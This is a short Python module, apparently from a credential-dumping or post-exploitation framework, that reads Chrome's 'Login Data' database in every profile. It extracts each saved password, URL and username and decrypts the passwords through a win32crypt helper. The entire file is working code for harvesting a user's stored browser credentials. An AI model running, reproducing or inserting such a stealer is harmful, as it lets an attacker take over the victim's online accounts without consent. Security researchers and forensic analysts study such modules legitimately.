# coding: utf-8

try:
	import os
	import sqlite3
	import win32crypt
except ImportError:
	pass

from modules.windows.chrome.chrome_module import ChromeModule
from internal import data_type
from api.windows import passwords


class WindowsChromePassword(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='WindowsChromePassword',
			version='0.1.0',
			file=__file__,
			dependencies=['os', 'sqlite3', 'win32crypt'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():

			self.cursor_getV2(
				path=profile + '/Login Data',
				items=[
					[data_type.Password, 'password_value', passwords.win32decrypt],
					[data_type.Link, 'action_url'],
					[data_type.Username, 'username_value'],
				],
				header=['password', 'url', 'username'],
				db='logins',
				spe=os.path.split(profile)[1],
			)

		return True
